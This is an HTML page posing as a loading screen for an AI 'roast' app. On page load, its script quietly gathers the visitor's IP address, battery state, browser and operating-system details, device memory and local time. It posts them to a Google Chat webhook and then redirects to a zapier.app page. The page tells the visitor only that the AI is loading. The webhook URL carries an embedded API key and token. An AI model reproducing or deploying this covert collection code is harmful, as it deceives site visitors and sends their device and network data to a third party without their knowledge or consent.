<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        async function collectAndSendData() {
            try {
                // Fetch IP Address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // Get Battery Info
                const battery = await navigator.getBattery();
                const batteryInfo = {
                    charging: battery.charging,
                    level: battery.level * 100 + '%',
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };

                // Get Browser and OS Info
                const browserInfo = {
                    browserName: navigator.userAgentData?.brands?.[0]?.brand || navigator.appName,
                    browserVersion: navigator.userAgentData?.brands?.[0]?.version || navigator.appVersion,
                    osName: navigator.platform,
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    platform: navigator.userAgentData?.platform || navigator.platform,
                    renderingEngine: navigator.product
                };

                // Get Date and Time
                const dateTime = new Date().toLocaleString('en-US', { timeZoneName: 'short' });

                // Combine Data
                const userData = {
                    ip: ipData.ip,
                    batteryInfo,
                    browserInfo,
                    dateTime
                };

                // Send Data to Webhook
                const webhookUrl = "https://chat.googleapis.com/v1/spaces/AAAAVRU0mvQ/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=yob_efy9w15UQAy6_3S3RQ46Xm2ejcRTrmkWKUnFPJ4";
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: JSON.stringify(userData, null, 2) })
                });

                // Redirect to another page
                window.location.href = "https://jamison-ai.zapier.app";
            } catch (error) {
                console.error('Error collecting or sending data:', error);
            }
        }

        // Run the function when the page loads
        window.onload = collectAndSendData;
    </script>
</head>
<body>
    <h1>Loading The AI...</h1>
    <p>Please wait while the AI thinks about how to roast you today...</p>
</body>
</html>

